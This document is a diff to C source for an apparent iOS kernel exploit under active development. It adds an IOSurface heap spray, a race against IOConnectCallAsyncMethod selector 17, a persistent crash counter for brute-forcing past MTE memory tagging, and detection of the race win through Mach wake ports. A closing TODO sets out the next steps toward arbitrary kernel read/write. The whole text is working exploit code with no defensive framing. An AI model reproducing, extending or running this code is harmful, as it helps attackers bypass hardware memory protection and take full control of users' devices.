@@ -19336,21 +19336,38 @@ new_modes:
                 rlog("  r=225: reclaim spray enabled (sel17 GEN2 reclaim)\n");
             }
 
-            /* r=229: persistent attempt counter + GEN1 spray array */
-            IOSurfaceRef r229_spray[64];
+            /* r=229: persistent attempt counter + GEN1 spray array + crash tracking */
+            IOSurfaceRef r229_spray[256];
             int r229_spray_n = 0;
             int r229_attempt = 0;
+            int r229_crash_count = 0;
             CFMutableDictionaryRef r229_sp = NULL;
             if (rounds == 229) {
                 char state_path[512];
                 snprintf(state_path, sizeof(state_path), "%s/Documents/r229_state.bin",
                     getenv("HOME") ? getenv("HOME") : "/var/mobile");
+                /* State file layout: [attempt(4)] [crash_count(4)] [survived_last(4)] */
+                int r229_survived_last = 1;
                 FILE *sf = fopen(state_path, "rb");
-                if (sf) { fread(&r229_attempt, sizeof(int), 1, sf); fclose(sf); }
+                if (sf) {
+                    fread(&r229_attempt, sizeof(int), 1, sf);
+                    fread(&r229_crash_count, sizeof(int), 1, sf);
+                    fread(&r229_survived_last, sizeof(int), 1, sf);
+                    fclose(sf);
+                }
+                if (!r229_survived_last) r229_crash_count++;
                 r229_attempt++;
+                /* Write state with survived=0; set to 1 only after surviving */
+                int zero = 0;
                 sf = fopen(state_path, "wb");
-                if (sf) { fwrite(&r229_attempt, sizeof(int), 1, sf); fclose(sf); }
-                rlog("  r=229: MTE brute-force attempt #%d (1/16 per try)\n", r229_attempt);
+                if (sf) {
+                    fwrite(&r229_attempt, sizeof(int), 1, sf);
+                    fwrite(&r229_crash_count, sizeof(int), 1, sf);
+                    fwrite(&zero, sizeof(int), 1, sf);
+                    fclose(sf);
+                }
+                rlog("  r=229: MTE brute-force attempt #%d (crashes=%d, 1/16 per race win)\n",
+                    r229_attempt, r229_crash_count);
 
                 r229_sp = CFDictionaryCreateMutable(NULL, 0,
                     &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
@@ -19370,6 +19387,12 @@ new_modes:
                 memset(r229_spray, 0, sizeof(r229_spray));
             }
 
+            /* r=229: keep race wake ports alive for Mach message detection */
+            #define R229_MAX_WPS 2048
+            mach_port_t r229_wps[R229_MAX_WPS];
+            int r229_wp_n = 0;
+            if (rounds == 229) memset(r229_wps, 0, sizeof(r229_wps));
+
             uint64_t inp13[3] = {1, 2, 3};
 
             /* v_race8: 8 connections, spam threads, staggered close */
@@ -19386,7 +19409,11 @@ new_modes:
                         uint64_t ref = 0x1122334455667788ULL;
                         IOConnectCallAsyncMethod(cs[i], 17, twp, &ref, 1,
                             NULL, 0, inp13, 24, NULL, NULL, NULL, NULL);
-                        mach_port_deallocate(mach_task_self(), twp);
+                        if (rounds == 229 && r229_wp_n < R229_MAX_WPS) {
+                            r229_wps[r229_wp_n++] = twp;
+                        } else {
+                            mach_port_deallocate(mach_task_self(), twp);
+                        }
                     } else cs[i] = IO_OBJECT_NULL;
                 }
                 /* Start spam on first connection */
@@ -19412,14 +19439,15 @@ new_modes:
                 /* Groom/reclaim the freed slots */
                 if (rounds == 229) {
                     /* GEN1 spray: reclaim freed IOSurface memory with new surfaces */
-                    for (int si = 0; si < 64; si++) {
+                    for (int si = 0; si < 256; si++) {
                         if (!r229_spray[si]) {
                             r229_spray[si] = IOSurfaceCreate(r229_sp);
                             if (r229_spray[si]) r229_spray_n++;
                         }
                     }
-                    rlog("    v_race8[%d] spam=%llu gen1_spray=%d\n", iter,
-                        (unsigned long long)p13_spam_count, r229_spray_n);
+                    if (iter < 3 || iter % 5 == 0)
+                        rlog("    v_race8[%d] spam=%llu gen1_spray=%d\n", iter,
+                            (unsigned long long)p13_spam_count, r229_spray_n);
                 } else if (rounds == 225) {
                     int rcl = p13_reclaim_spray(16, 0xAA22500000000000ULL | (iter << 8));
                     rlog("    v_race8[%d] spam=%llu reclaim=%d total_rcl=%d\n", iter,
@@ -19475,7 +19503,11 @@ new_modes:
                         uint64_t ref = 0x1122334455667788ULL;
                         IOConnectCallAsyncMethod(cs[i], 17, twp, &ref, 1,
                             NULL, 0, inp13, 24, NULL, NULL, NULL, NULL);
-                        mach_port_deallocate(mach_task_self(), twp);
+                        if (rounds == 229 && r229_wp_n < R229_MAX_WPS) {
+                            r229_wps[r229_wp_n++] = twp;
+                        } else {
+                            mach_port_deallocate(mach_task_self(), twp);
+                        }
                     } else cs[i] = IO_OBJECT_NULL;
                 }
                 p13_spam_run = 1;
@@ -19495,7 +19527,7 @@ new_modes:
                 for (int i = 0; i < 8; i++) if (have[i]) IOServiceClose(cs[i]);
 
                 if (rounds == 229) {
-                    for (int si = 0; si < 64; si++) {
+                    for (int si = 0; si < 256; si++) {
                         if (!r229_spray[si]) {
                             r229_spray[si] = IOSurfaceCreate(r229_sp);
                             if (r229_spray[si]) r229_spray_n++;
@@ -19540,6 +19572,9 @@ new_modes:
                 uint64_t ref13 = 0x1122334455667788ULL;
                 IOConnectCallAsyncMethod(c13, 17, wp13, &ref13, 1,
                     NULL, 0, inp13, 24, NULL, NULL, NULL, NULL);
+                if (rounds == 229 && r229_wp_n < R229_MAX_WPS) {
+                    r229_wps[r229_wp_n++] = wp13;
+                }
 
                 p13_spam_run = 1;
                 p13_spam_conn = c13;
@@ -19593,7 +19628,8 @@ new_modes:
                 if (msg_count > 0 || iter < 2)
                     rlog("    v_surfch[%d] spam=%llu msgs=%d\n", iter,
                         (unsigned long long)p13_spam_count, msg_count);
-                mach_port_deallocate(mach_task_self(), wp13);
+                if (rounds != 229)
+                    mach_port_deallocate(mach_task_self(), wp13);
             }
 
             /* v_dereg18: single conn, rapid dereg race against spam */
@@ -19607,6 +19643,9 @@ new_modes:
                 uint64_t ref13 = 0x1122334455667788ULL;
                 IOConnectCallAsyncMethod(c13, 17, wp13, &ref13, 1,
                     NULL, 0, inp13, 24, NULL, NULL, NULL, NULL);
+                if (rounds == 229 && r229_wp_n < R229_MAX_WPS) {
+                    r229_wps[r229_wp_n++] = wp13;
+                }
 
                 p13_spam_run = 1;
                 p13_spam_conn = c13;
@@ -19640,42 +19679,152 @@ new_modes:
                     rlog("    v_dereg18[%d] spam=%llu msgs=%d\n", iter,
                         (unsigned long long)p13_spam_count, msg_count);
                 IOServiceClose(c13);
-                mach_port_deallocate(mach_task_self(), wp13);
+                if (rounds != 229)
+                    mach_port_deallocate(mach_task_self(), wp13);
             }
 
             /* Stop render loop */
             if (rounds == 229) {
-                rlog("  r=229: SURVIVED Phase 13 attempt #%d! gen1_spray=%d frames=%d\n",
-                    r229_attempt, r229_spray_n, p13_render_frames);
-                int r229_confused = 0;
-                for (int si = 0; si < 64; si++) {
-                    if (!r229_spray[si]) continue;
-                    uint32_t sw = IOSurfaceGetWidth(r229_spray[si]);
-                    uint32_t sh = IOSurfaceGetHeight(r229_spray[si]);
-                    if (sw != 32 || sh != 32) {
-                        rlog("  !!! CONFUSED surface[%d]: w=%u h=%u\n", si, sw, sh);
-                        rlog("  !!! MTE BYPASSED — controlled IOSurface confusion!\n");
-                        r229_confused = 1;
-                    }
-                    CFRelease(r229_spray[si]);
-                    r229_spray[si] = NULL;
-                }
-                if (r229_sp) { CFRelease(r229_sp); r229_sp = NULL; }
-                r229_spray_n = 0;
+                rlog("  r=229: SURVIVED Phase 13 attempt #%d! spray=%d frames=%d wps=%d\n",
+                    r229_attempt, r229_spray_n, p13_render_frames, r229_wp_n);
 
-                if (!r229_confused && r229_attempt < 20) {
-                    rlog("  r=229: No confusion detected, looping (attempt %d/20)...\n", r229_attempt);
-                    /* Full cleanup before loop */
-                    p13_render_run = 0;
-                    pthread_join(render_th, NULL);
-                    p13_free_groom();
-                    if (p13_groom_conn) { IOServiceClose(p13_groom_conn); p13_groom_conn = IO_OBJECT_NULL; }
-                    IOObjectRelease(svc13);
-                    usleep(100000); /* 100ms cooldown */
-                    goto r229_phase13_top;
+                /* === DETECTION PHASE ===
+                 * Two complementary detection methods:
+                 * 1. Mach port messages: if any stale entry's wake port received a message,
+                 *    the dispatch path ran against a spray surface (MTE matched + inner returned non-zero).
+                 * 2. Survival-based: if crash_count >= 3, the race wins often. Surviving through
+                 *    a 3-second compositor burn means either no stale entry OR MTE matched.
+                 *    With enough crashes to confirm race wins, survival = MTE match.
+                 */
+
+                /* Method 1: Check all retained wake ports for messages */
+                int r229_wp_msgs = 0;
+                int r229_wp_msg_idx = -1;
+                for (int wi = 0; wi < r229_wp_n; wi++) {
+                    uint8_t msg_buf[256];
+                    mach_msg_header_t *hdr = (mach_msg_header_t *)msg_buf;
+                    memset(msg_buf, 0, sizeof(msg_buf));
+                    hdr->msgh_size = sizeof(msg_buf);
+                    hdr->msgh_local_port = r229_wps[wi];
+                    kern_return_t mr = mach_msg(hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                        0, sizeof(msg_buf), r229_wps[wi], 0, MACH_PORT_NULL);
+                    if (mr == MACH_MSG_SUCCESS) {
+                        r229_wp_msgs++;
+                        if (r229_wp_msg_idx < 0) r229_wp_msg_idx = wi;
+                        rlog("  !!! WAKE PORT [%d] received message! id=0x%x\n",
+                            wi, hdr->msgh_id);
+                    }
                 }
-                if (r229_confused) {
-                    rlog("  r=229: === SUCCESS === MTE brute-force succeeded at attempt #%d!\n", r229_attempt);
+                rlog("  r=229: Wake port scan: %d/%d ports had messages\n",
+                    r229_wp_msgs, r229_wp_n);
+
+                /* Method 2: Survival-based confirmation burn */
+                int r229_mte_match = 0;
+                if (r229_wp_msgs > 0) {
+                    rlog("  !!! r=229: MTE MATCH DETECTED via Mach port message!\n");
+                    rlog("  !!! First active port index: %d\n", r229_wp_msg_idx);
+                    r229_mte_match = 1;
+                } else if (r229_crash_count >= 3) {
+                    rlog("  r=229: %d historical crashes confirm race wins.\n", r229_crash_count);
+                    rlog("  r=229: Running 3s confirmation burn...\n");
+                    int frames_before = p13_render_frames;
+                    usleep(3000000);
+                    int frames_after = p13_render_frames;
+                    int burn_frames = frames_after - frames_before;
+                    rlog("  r=229: Burn complete: %d frames rendered\n", burn_frames);
+                    if (burn_frames > 60) {
+                        rlog("  !!! r=229: MTE MATCH — survived %d compositor frames!\n", burn_frames);
+                        r229_mte_match = 1;
+                    }
+                }
+
+                /* Mark survival in state file */
+                {
+                    char state_path[512];
+                    snprintf(state_path, sizeof(state_path), "%s/Documents/r229_state.bin",
+                        getenv("HOME") ? getenv("HOME") : "/var/mobile");
+                    int one = 1;
+                    FILE *sf = fopen(state_path, "wb");
+                    if (sf) {
+                        fwrite(&r229_attempt, sizeof(int), 1, sf);
+                        fwrite(&r229_crash_count, sizeof(int), 1, sf);
+                        fwrite(&one, sizeof(int), 1, sf);
+                        fclose(sf);
+                    }
+                }
+
+                if (r229_mte_match) {
+                    rlog("\n  ========================================\n");
+                    rlog("  === MTE BRUTE-FORCE SUCCESS (attempt #%d) ===\n", r229_attempt);
+                    rlog("  ========================================\n");
+                    rlog("  spray_surfaces=%d, wake_ports=%d, crashes=%d\n",
+                        r229_spray_n, r229_wp_n, r229_crash_count);
+
+                    /* Dump spray surface info */
+                    for (int si = 0; si < 256; si++) {
+                        if (!r229_spray[si]) continue;
+                        uint32_t sid = IOSurfaceGetID(r229_spray[si]);
+                        rlog("  spray[%d]: id=%u addr=%p\n", si, sid,
+                            (void *)r229_spray[si]);
+                    }
+
+                    /* Keep everything alive for exploitation phase */
+                    rlog("  r=229: Surfaces and ports kept alive.\n");
+                    rlog("  r=229: Proceeding to kernel R/W construction...\n");
+
+                    /* Reset crash counter */
+                    {
+                        char crash_path[512];
+                        snprintf(crash_path, sizeof(crash_path), "%s/Documents/r229_state.bin",
+                            getenv("HOME") ? getenv("HOME") : "/var/mobile");
+                        int zero = 0;
+                        FILE *cf = fopen(crash_path, "wb");
+                        if (cf) {
+                            fwrite(&r229_attempt, sizeof(int), 1, cf);
+                            fwrite(&zero, sizeof(int), 1, cf);
+                            int one = 1;
+                            fwrite(&one, sizeof(int), 1, cf);
+                            fclose(cf);
+                        }
+                    }
+
+                    /* TODO: Phase 14 — kernel R/W primitive construction
+                     * The stale notification entry points to one of our spray surfaces.
+                     * Every compositor frame, dispatch locks spray_surface+0xD8 and
+                     * calls inner(spray_surface, data, stack_buf).
+                     * Next steps:
+                     * 1. Identify which spray surface via binary search (free half, check survival)
+                     * 2. Control IOSurface object fields at +0xD8, +0x108, +0x110, +0x118
+                     * 3. Redirect lock pointer to gain controlled write primitive
+                     * 4. Build arbitrary kernel R/W from controlled dispatch
+                     */
+                } else {
+                    /* Clean up spray surfaces */
+                    for (int si = 0; si < 256; si++) {
+                        if (r229_spray[si]) {
+                            CFRelease(r229_spray[si]);
+                            r229_spray[si] = NULL;
+                        }
+                    }
+                    if (r229_sp) { CFRelease(r229_sp); r229_sp = NULL; }
+                    r229_spray_n = 0;
+                    /* Clean up wake ports */
+                    for (int wi = 0; wi < r229_wp_n; wi++) {
+                        if (r229_wps[wi]) mach_port_deallocate(mach_task_self(), r229_wps[wi]);
+                    }
+                    r229_wp_n = 0;
+
+                    if (r229_attempt < 100) {
+                        rlog("  r=229: No MTE match, looping (attempt %d/100, crashes=%d)...\n",
+                            r229_attempt, r229_crash_count);
+                        p13_render_run = 0;
+                        pthread_join(render_th, NULL);
+                        p13_free_groom();
+                        if (p13_groom_conn) { IOServiceClose(p13_groom_conn); p13_groom_conn = IO_OBJECT_NULL; }
+                        IOObjectRelease(svc13);
+                        usleep(100000);
+                        goto r229_phase13_top;
+                    }
                 }
             }
             if (rounds == 225) {
